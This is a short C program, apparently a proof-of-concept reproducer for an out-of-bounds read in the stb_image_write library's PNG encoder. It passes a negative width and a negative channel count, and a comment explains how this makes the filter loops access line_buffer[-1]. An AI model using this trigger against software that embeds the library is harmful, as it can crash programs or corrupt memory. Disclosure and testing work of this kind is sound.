#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"
#include <stdlib.h>

int main(void)
{
   unsigned char buf[64] = {0};
   int len;
   // x=-2, n=-1 → products are positive (allocations succeed),
   // but n is negative so filter encoding loops access line_buffer[-1]
   stbi_write_force_png_filter = 1;
   stbi_write_png_to_mem(buf, 0, -2, 1, -1, &len);
   return 0;
}
